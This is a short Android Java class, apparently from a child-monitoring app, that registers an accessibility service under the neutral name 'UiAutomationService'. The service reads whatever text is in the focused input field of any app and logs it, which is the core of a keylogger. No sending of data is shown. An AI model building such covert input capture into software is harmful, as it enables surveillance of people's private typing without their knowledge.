package com.kidsguard.child;
import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityNodeInfo;
import android.util.Log;
public class UiAutomationService extends AccessibilityService {
    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityServiceInfo.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS;
        info.notificationTimeout = 100;
        setServiceInfo(info);
    }
    public void extractInput() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root == null) return;
        try {
            AccessibilityNodeInfo focus = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focus != null && focus.getText() != null) processText(focus.getText().toString());
        } finally { root.recycle(); }
    }
    private void processText(String t) { Log.d("UiAuto", t); }
    @Override public void onAccessibilityEvent(android.view.accessibility.AccessibilityEvent e) {}
    @Override public void onInterrupt() {}
}
